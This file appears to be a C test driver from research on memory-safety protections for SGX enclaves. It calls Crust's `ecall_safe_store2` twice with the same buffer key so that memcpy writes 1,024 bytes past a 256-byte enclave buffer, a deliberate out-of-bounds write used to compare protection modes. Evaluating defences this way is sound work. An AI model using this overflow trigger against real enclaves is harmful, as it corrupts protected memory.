/* Hostile C01 stateful-buffer-pool control for the selected Crust ECALL.
 *
 * The pinned original `ecall_safe_store2` keeps a global pool keyed by the
 * host-supplied `buffer_key` and trusts `total_size`, `partial_size` and
 * `offset` across calls.  This driver performs the C01 two-call sequence:
 *
 *   1. same key K, total_size=0x100, partial_size=1, offset=0
 *      -> allocates and retains one 256-byte application buffer.
 *   2. same key K, total_size=0x1000, partial_size=0x400, offset=0x800
 *      -> reuses that 256-byte buffer and asks memcpy to write 1,024 bytes
 *         2,048 bytes past its start.
 *
 * Neither call completes the transfer (offset+partial_size < total_size), so
 * the terminal restore callback is not reached.  BASELINE executes the raw
 * write.  RADIX_ONLY/MAC27 should reject the destination range before the
 * write.
 *
 * This driver uses only the unchanged public ECALL.  It asserts nothing about
 * the expected protection outcome: the runner records the return status or
 * signal and attributes it separately.  No hardware or exploit claim follows.
 */
#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include "sgx_urts.h"
#include "enclave_u.h"

#define C01_KEY 0x434f3031u /* arbitrary same-key token; "C01" */
#define C01_PAYLOAD 0x400u
#define C01_TOTAL 0x1000u
#define C01_OFFSET 0x800u

/* Debugger anchor: symbols for the enclave image are added after this point. */
__attribute__((noinline)) void crust_c01_hostile_ready(void)
{
    __asm__ volatile("" ::: "memory");
}

int main(int argc, char **argv)
{
    if (argc != 2) {
        fprintf(stderr, "usage: %s <enclave.signed.so>\n", argv[0]);
        return 2;
    }
    sgx_enclave_id_t eid = 0;
    sgx_status_t status = sgx_create_enclave(argv[1], SGX_DEBUG_FLAG, NULL,
                                             NULL, &eid, NULL);
    if (status) {
        fprintf(stderr, "create=%#x\n", (unsigned)status);
        return 3;
    }
    crust_c01_hostile_ready();

    uint8_t one = 0x41;
    crust_status_t first = 0xdeadbeefu, second = 0xdeadbeefu;
    sgx_status_t first_transport =
        ecall_safe_store2(eid, &first, ECALL_RESTORE_FROM_UPGRADE, &one,
                          0x100, 1, 0, C01_KEY);
    fprintf(stderr, "first transport=%#x app=%#x\n",
            (unsigned)first_transport, (unsigned)first);
    fflush(stderr);
    if (first_transport != SGX_SUCCESS || first != CRUST_SUCCESS) {
        fprintf(stderr, "first call did not retain the 256-byte buffer\n");
        return 10;
    }

    uint8_t payload[C01_PAYLOAD];
    for (unsigned i = 0; i < sizeof payload; ++i)
        payload[i] = (uint8_t)(i * 7 + 3);

    /* The original body reuses the same-key buffer and calls
     * memcpy(buffer + 0x800, payload, 0x400) on a 256-byte slot. */
    sgx_status_t second_transport =
        ecall_safe_store2(eid, &second, ECALL_RESTORE_FROM_UPGRADE, payload,
                          C01_TOTAL, C01_PAYLOAD, C01_OFFSET, C01_KEY);
    fprintf(stderr, "second transport=%#x app=%#x\n",
            (unsigned)second_transport, (unsigned)second);
    printf("{\"mode\":\"hostile\",\"first\":[%u,%u],\"second\":[%u,%u],"
           "\"total_size\":%u,\"partial_size\":%u,\"offset\":%u}\n",
           (unsigned)first_transport, (unsigned)first,
           (unsigned)second_transport, (unsigned)second,
           C01_TOTAL, C01_PAYLOAD, C01_OFFSET);
    fflush(stdout);

    sgx_destroy_enclave(eid);
    return (second_transport == SGX_SUCCESS && second == CRUST_SUCCESS) ? 0 : 11;
}
